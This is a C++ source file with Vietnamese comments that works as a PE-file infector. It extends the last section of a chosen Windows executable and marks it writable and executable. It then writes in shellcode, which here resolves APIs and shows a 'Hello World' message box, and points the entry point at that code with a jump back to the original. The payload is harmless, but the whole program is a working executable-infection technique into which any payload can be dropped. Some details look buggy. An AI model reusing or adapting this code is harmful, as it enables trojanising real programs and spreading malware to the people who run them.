#include <Windows.h>
#include <iostream>
OPENFILENAME ofn;

char szFile[100];
CHAR buff[255];
DWORD num;

DWORD EOP;
int check_size(PCHAR pfind, int size);
using namespace std;
int main()
{
	/****************************************************************************
	fill struct openfilename
	*/
	ofn.lStructSize = sizeof(ofn);
	ofn.hwndOwner = NULL;
	ofn.lpstrFile = (LPWSTR)szFile;
	ofn.nMaxFile = sizeof(szFile);
	ofn.lpstrFilter = L"ALL\0*.*\0Text\0*.TXT\0";
	ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;
	if (GetOpenFileName(&ofn))
	{
		/*
		Open file
		*/
		HANDLE hFile = CreateFile(ofn.lpstrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, 0);
			if (hMapping != NULL)
			{
				char* pMapping = (char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
				PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)pMapping;
				CloseHandle(hFile);
				/*
				Check PE file
				*/
				if (dos_header->e_magic == IMAGE_DOS_SIGNATURE)
				{
					PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)(pMapping + dos_header->e_lfanew);
					__try
					{
						if (header->Signature == IMAGE_NT_SIGNATURE)
						{
							// Mở rộng section cuối cùng 0x100h
							WORD numsec = header->FileHeader.NumberOfSections - 1;
							PIMAGE_SECTION_HEADER Final_Section = (PIMAGE_SECTION_HEADER)(pMapping + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + numsec * sizeof(IMAGE_SECTION_HEADER));
							// tính vị trí từ thành phần
							DWORD Characteristics = (DWORD)((DWORD)Final_Section - (DWORD)pMapping + 36);
							DWORD RawSize = (DWORD)((DWORD)Final_Section - (DWORD)pMapping + 16);
							DWORD VirtualSize = (DWORD)((DWORD)Final_Section - (DWORD)pMapping + 8);
							DWORD SizeOfImage = (DWORD)((DWORD)header - (DWORD)pMapping + 80);
							// add 0x100h vào các thành phần đã tính
							DWORD newVirtualSize = Final_Section->SizeOfRawData + 0x100;
							DWORD newRawSize = Final_Section->SizeOfRawData + 0x100;
							DWORD newCharacteristics = 0xE0000060;
							DWORD newSizeOfImage = Final_Section->Misc.VirtualSize + Final_Section->VirtualAddress;
							DWORD sw = Final_Section->PointerToRawData + Final_Section->SizeOfRawData;
							DWORD newEOP = Final_Section->PointerToRawData + Final_Section->SizeOfRawData;
							DWORD RVAnewEOP = newEOP - Final_Section->PointerToRawData + Final_Section->VirtualAddress;
							// lấy địa chỉ con trỏ
							HANDLE hWrite = CreateFile(ofn.lpstrFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);
							// chuyển DWORD sang String rồi viết vào file theo các địa chỉ đã tính
							SetFilePointer(hWrite, SizeOfImage, 0, FILE_BEGIN);
							WriteFile(hWrite, &newSizeOfImage, 4, &num, NULL);
							SetFilePointer(hWrite, VirtualSize, 0, FILE_BEGIN);
							WriteFile(hWrite, &newVirtualSize, 4, &num, NULL);
							SetFilePointer(hWrite, RawSize, 0, FILE_BEGIN);
							WriteFile(hWrite, &newRawSize, 4, &num, NULL);
							SetFilePointer(hWrite, Characteristics, 0, FILE_BEGIN);
							WriteFile(hWrite, &newCharacteristics, 4, &num, NULL);
							SetFilePointer(hWrite, sw, 0, FILE_BEGIN);
							WriteFile(hWrite, "\x00", 0x100, &num, NULL);
							// kết thúc mở rộng section cuối cùng
							//*********************************************************
							// Chèn Shellcode vào phần mở rộng của section cuối cùng
							CHAR shellcode[] =
								"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
								"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
								"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
								"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
								"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
								"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
								"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
								"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
								"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
								"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
								"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
								"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
								"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
								"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
								"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
								"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
								"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
								"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
								"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
								"\x69\x74\x54\x53\xff\xd6\x57";
							DWORD oldEOP = (DWORD)&header->OptionalHeader.AddressOfEntryPoint - (DWORD)pMapping;
							wsprintfA(buff, "\x60%s\x61\xe9", shellcode);
							DWORD len = strlen(buff);
							DWORD RVAendShellcode = RVAnewEOP + len;
							DWORD endShellcode = newEOP + len;
							// tính khoảng cách cho jmp
							DWORD jum_oldEOP = header->OptionalHeader.AddressOfEntryPoint - RVAendShellcode - 4;
							// viết shellcode vào newEOP
							SetFilePointer(hWrite, newEOP, 0, FILE_BEGIN);
							WriteFile(hWrite, buff, len, &num, NULL);
							// viết khoảng cách vào sau jmp
							SetFilePointer(hWrite, endShellcode, 0, FILE_BEGIN);
							WriteFile(hWrite, &jum_oldEOP, 4, &num, NULL);
							// Chỉnh lại EP
							SetFilePointer(hWrite, oldEOP, 0, FILE_BEGIN);
							WriteFile(hWrite, &RVAnewEOP, 4, &num, NULL);
							MessageBoxA(NULL, "DONE", "INFO", MB_OK);
							exit(0);
						}
					}
					__except (EXCEPTION_EXECUTE_HANDLER)
					{
						cout << "ok";
					}
					
				}
				else
				{
					MessageBox(NULL, L"This file is not PE file", L"NOTE", MB_OK);
				}

			}
			else
			{
				MessageBox(NULL, L"Cannot open the file for memory mapping", L"NOTE", MB_OK);
			}
		}
		else
		{
			MessageBox(NULL, L"Cannot open the file for reading", L"NOTE", MB_OK);
		}
	}

}
int check_size(PCHAR pfind, int size)
{
	for (int i = 0; i < size; i++)
	{
		if (*pfind != 0x00)
		{
			return 0;
		}
		pfind++;
	}
	return 1;
}